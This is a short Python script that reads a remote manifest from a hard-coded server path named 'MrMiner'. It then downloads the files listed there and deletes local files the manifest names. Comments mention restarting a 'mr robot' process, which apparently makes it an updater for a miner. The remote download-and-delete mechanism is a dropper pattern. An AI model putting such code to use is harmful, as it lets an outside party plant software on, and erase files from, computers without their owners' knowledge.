import urllib.request
import os
import sys
#get the argument shit sorted out
#check other comments
version = str(sys.argv)
with urllib.request.urlopen('http://fitlifeapp.com/MrMiner/test.txt') as response:
   html = response.read()
   stuff = html.decode("utf-8").splitlines()#.decode("utf-8").splitlines()
#urllib.request.urlretrieve ("http://fitlifeapp.com/MrMiner/pasc-logo.png", "yougood.png")
erase = 0
print (stuff[0].split(' ')[1])
if stuff[0].split(' ')[1] != version:
    for i in stuff[1:]:
        if erase == 0:
            if i == 'borrar':
                erase = 1
            else:
                urllib.request.urlretrieve(i.split(' ')[0], i.split(' ')[1])
        else:
            if os.path.isfile(i):
                #maybe have to add process kill before deleteing the mrrobot
                os.remove(i)
            #if killed mr robot start new mr robot